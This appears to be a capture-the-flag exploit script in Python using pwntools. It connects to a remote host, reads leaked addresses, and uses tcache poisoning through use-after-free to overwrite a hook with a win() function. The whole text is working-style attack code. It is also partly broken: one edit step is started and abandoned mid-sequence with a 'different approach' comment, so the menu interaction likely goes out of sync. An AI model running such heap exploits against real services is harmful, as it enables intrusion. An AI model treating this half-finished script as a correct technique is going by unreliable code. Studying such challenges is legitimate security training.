#!/usr/bin/env python3
from pwn import *

io = remote('212.2.250.33', 32384)

# Get addresses
banner = io.recvuntil(b'>')
import re
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

print(f"[+] win: 0x{win:x}, hook: 0x{hook:x}")

# Tcache poisoning attack
# 1. Create and free chunks to populate tcache
# 2. Use off-by-one to corrupt tcache fd pointer
# 3. Allocate to get chunk at hook address
# 4. Write win() to hook

# Create chunks
for i in range(3):
    io.sendline(b'1')
    io.sendlineafter(b':', b'24')
    io.sendlineafter(b':', b'X' * 24)
    io.recvuntil(b'>')

# Free chunks 0 and 1 to populate tcache
io.sendline(b'3')
io.sendlineafter(b':', b'0')
io.recvuntil(b'>')

io.sendline(b'3')
io.sendlineafter(b':', b'1')
io.recvuntil(b'>')

# Edit chunk 2 with off-by-one to corrupt freed chunk's fd
io.sendline(b'2')
io.sendlineafter(b':', b'2')
# We need to write backwards to corrupt the fd of freed chunk
# This is tricky - let's try a different approach

# Actually, let's use UAF (use-after-free)
# Print freed chunk to leak tcache fd
io.sendline(b'4')
io.sendlineafter(b':', b'0')
data = io.recvuntil(b'>')
print(data)

# Now reallocate and poison tcache
io.sendline(b'1')
io.sendlineafter(b':', b'24')
# Write hook address as next tcache entry
io.sendlineafter(b':', p64(hook - 0x10) + b'Y' * 16)  # -0x10 for chunk header
io.recvuntil(b'>')

# Allocate once more
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', b'Z' * 24)
io.recvuntil(b'>')

# Next allocation should be at hook
io.sendline(b'1')
io.sendlineafter(b':', b'24')
io.sendlineafter(b':', p64(0) + p64(win) + b'W' * 8)  # Write win to hook
io.recvuntil(b'>')

# Trigger
io.sendline(b'3')
io.sendlineafter(b':', b'2')

output = io.recvall(timeout=2)
print(output.decode(errors='ignore'))
io.close()
